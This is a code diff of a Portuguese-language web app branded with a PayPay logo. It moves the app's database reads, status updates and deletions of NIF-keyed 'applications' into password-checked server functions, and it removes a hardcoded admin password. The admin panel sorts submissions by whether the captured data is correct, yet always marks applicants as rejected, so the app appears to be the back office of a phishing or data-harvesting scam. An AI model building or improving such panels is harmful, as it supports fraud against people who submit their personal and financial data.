@@ -1,13 +1,15 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useState, useEffect, useRef, useMemo } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check, Trash2, Search, XCircle, AlertTriangle } from "lucide-react";
+import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check, Trash2, Search, XCircle, AlertTriangle, Loader2 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { toast } from "sonner";
 import logoPaypay from "@/assets/logo-paypay.png";
 import keyIconAsset from "@/assets/key-icon.png";
 import userIconAsset from "@/assets/chat-logo.png";
 import successIconAsset from "@/assets/chat-logo.png";
+import { verifyAdminPassword, updateApplicationStatus, deleteApplication, getApplications, checkApplicationStatus } from "@/lib/admin.functions";
+
 
 export const Route = createFileRoute("/")({
   component: Index,
@@ -57,6 +59,8 @@ function Index() {
 
   const [adminAuthenticated, setAdminAuthenticated] = useState(false);
   const [adminPassword, setAdminPassword] = useState("");
+  const [loading, setLoading] = useState(false);
+
 
   const saveProgress = async () => {
     // Don't save if on home or admin steps
@@ -197,16 +201,9 @@ function Index() {
 
       setLoading(true);
       try {
-        const { supabase } = await import("@/integrations/supabase/client");
-        const { data, error } = await supabase
-          .from("pending_applications")
-          .select("status, rejection_reason")
-          .eq("nif", checkNif.toUpperCase())
-          .order("created_at", { ascending: false })
-          .limit(1)
-          .single();
+        const data = await checkApplicationStatus({ data: { nif: checkNif } });
         
-        if (error || !data) {
+        if (!data) {
           toast.error("Nenhuma candidatura encontrada para este NIF.");
           setCheckResult(null);
         } else {
@@ -220,6 +217,7 @@ function Index() {
       } finally {
         setLoading(false);
       }
+
     };
 
     return (
@@ -290,75 +288,63 @@ function Index() {
     const [loading, setLoading] = useState(true);
 
     const fetchApps = async () => {
-      const { supabase } = await import("@/integrations/supabase/client");
-      const { data } = await supabase
-        .from("pending_applications")
-        .select("*")
-        .order("created_at", { ascending: false });
-      
-      if (data) setApps(data);
-      setLoading(false);
+      try {
+        const data = await getApplications({ data: { adminPassword } });
+        if (data) setApps(data);
+      } catch (err) {
+        toast.error("Erro ao carregar dados");
+      } finally {
+        setLoading(false);
+      }
     };
 
     useEffect(() => {
-      fetchApps();
-    }, []);
+      if (adminAuthenticated) {
+        fetchApps();
+      }
+    }, [adminAuthenticated]);
 
     const updateStatus = async (id: string, isCorrect: boolean) => {
       try {
-        const { supabase } = await import("@/integrations/supabase/client");
-        const status = "Reprovado";
-        const reason = isCorrect ? "Não se qualifica" : "Dados incorretos";
-        
-        const payload = { 
-          status, 
-          rejection_reason: reason,
-          analysis_color: isCorrect ? 'green' : 'red'
-        };
-        
-        const { error } = await supabase
-          .from("pending_applications")
-          .update(payload)
-          .eq("id", id);
-        
-        if (error) {
-          toast.error("Erro ao atualizar análise: " + error.message);
-        } else {
-          toast.success(isCorrect ? "Marcado como 'Dados Corretos'" : "Marcado como 'Dados Errados'");
-          fetchApps();
-        }
-      } catch (err) {
-        toast.error("Erro inesperado");
+        await updateApplicationStatus({ 
+          data: { 
+            id, 
+            isCorrect, 
+            adminPassword 
+          } 
+        });
+        toast.success(isCorrect ? "Marcado como 'Dados Corretos'" : "Marcado como 'Dados Errados'");
+        fetchApps();
+      } catch (err: any) {
+        toast.error("Erro ao atualizar análise: " + (err.message || "Erro inesperado"));
       }
     };
+
 
     const deleteItem = async (id: string) => {
       if (!confirm("Tem certeza que deseja apagar estes dados? Esta ação não pode ser desfeita.")) return;
       
       try {
-        const { supabase } = await import("@/integrations/supabase/client");
         if (!id) {
           toast.error("ID inválido");
           return;
         }
 
-        const { error } = await supabase
-          .from("pending_applications")
-          .delete()
-          .eq("id", id);
+        await deleteApplication({ 
+          data: { 
+            id, 
+            adminPassword 
+          } 
+        });
         
-        if (error) {
-          console.error("Supabase delete error:", error);
-          toast.error(`Erro ao apagar dados: ${error.message}`);
-        } else {
-          toast.success("Dados apagados com sucesso");
-          setApps(prev => prev.filter(app => app.id !== id));
-          fetchApps();
-        }
-      } catch (err) {
+        toast.success("Dados apagados com sucesso");
+        setApps(prev => prev.filter(app => app.id !== id));
+        fetchApps();
+      } catch (err: any) {
         console.error("Unexpected error deleting item:", err);
-        toast.error("Erro inesperado ao apagar dados");
+        toast.error("Erro ao apagar dados: " + (err.message || "Erro inesperado"));
       }
+
     };
 
     if (loading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando candidaturas...</div>;
@@ -1073,19 +1059,25 @@ function Index() {
                       />
                     </div>
                     <button
-                      onClick={() => {
-                        if (adminPassword === "moneytool") {
+                      disabled={loading}
+                      onClick={async () => {
+                        setLoading(true);
+                        try {
+                          await verifyAdminPassword({ data: { password: adminPassword } });
                           setAdminAuthenticated(true);
                           toast.success("Acesso autorizado!");
-                        } else {
-                          toast.error("Senha incorreta!");
+                        } catch (err) {
+                          toast.error("Senha incorreta ou erro de acesso!");
+                        } finally {
+                          setLoading(false);
                         }
                       }}
-                      className="w-full bg-primary text-primary-foreground h-14 rounded-2xl font-semibold text-lg shadow-lg cursor-pointer"
+                      className="w-full bg-primary text-primary-foreground h-14 rounded-2xl font-semibold text-lg shadow-lg cursor-pointer flex items-center justify-center gap-2"
                     >
-                      Aceder ao Painel
+                      {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Aceder ao Painel"}
                     </button>
                   </div>
+
                 ) : (
                   <div className="space-y-6">
                     <section className="space-y-3">
